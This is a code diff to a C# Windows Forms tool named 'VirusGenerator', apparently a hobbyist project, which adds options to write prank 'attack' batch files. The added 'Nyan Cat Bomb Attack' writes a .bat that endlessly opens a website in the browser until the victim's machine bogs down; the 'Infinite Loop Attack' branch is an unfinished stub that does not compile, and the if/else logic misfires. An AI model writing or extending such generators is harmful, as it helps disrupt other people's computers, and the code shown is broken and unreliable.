@@ -40,8 +40,26 @@ namespace VirusGenerator
 
         private void BtnGen_Click(object sender, EventArgs e)
         {
-            _outputFolder = TxtBoxDes.Text;
-            file_name    = TxtBoxFileName.Text;
+            _outputFolder = @TxtBoxDes.Text; //if needed add a @ to the beginning of this.
+            file_name     = TxtBoxFileName.Text;
+            fileExt       = CBoxFor.Text;
+
+            if (CBoxAttack.Text == "Nyan Cat Bomb Attack")
+            {
+                string[] nyanCatCmd = { "@echo off", ":loop", "start http://www.nyancat.com", "goto loop" };
+                System.IO.File.WriteAllLines(_outputFolder + file_name + fileExt, nyanCatCmd);
+            }
+            if (CBoxAttack.Text == "Infinite Loop Attack")
+            {
+                string[] infiniteLoopCmd = { "@echo off", ":loop"}
+            }
+            else
+            {
+                MessageBox.Show("That's not a valid command.");
+            }
+            
+
+
         }
 
         public void CBoxFor_SelectedIndexChanged(object sender, EventArgs e)
@@ -56,36 +74,37 @@ namespace VirusGenerator
                 fileExt = ".bat";
             }
 
-            ToolStrip.Text = $"Format Selected: '{formatSelected}'";
+            ToolStrip.Text = $"Format Selected: '{formatSelected}'"; //Updates tool stip with format
         }
 
         private void versionToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            MessageBox.Show("Troy \nVirusGenerator v1.0 \n2015");
+            MessageBox.Show("Troy \nVirusGenerator v1.0 \n2015"); //About message
         }
 
         private void BtnExit_Click(object sender, EventArgs e)
         {
-            Close();
+            Close(); //closes program when clicked.
         }
 
         private void TxtBoxFileName_TextChanged(object sender, EventArgs e)
         {
-            ToolStrip.Text = $"Name Chosen: '{TxtBoxFileName.Text}'";
+            ToolStrip.Text = $"Name Chosen: '{TxtBoxFileName.Text}'"; //shows updated name in the tool stip
+
         }
 
         private void CBoxAttack_SelectedIndexChanged(object sender, EventArgs e)
         {
             string attackSelected = CBoxAttack.Text;
 
-
+            //More code will go here.
 
             ToolStrip.Text = $"Attack Selected: '{attackSelected}'";
         }
 
         private void closeToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            Close();
+            Close(); //closes program from the menu stip.
         }
     }
 }
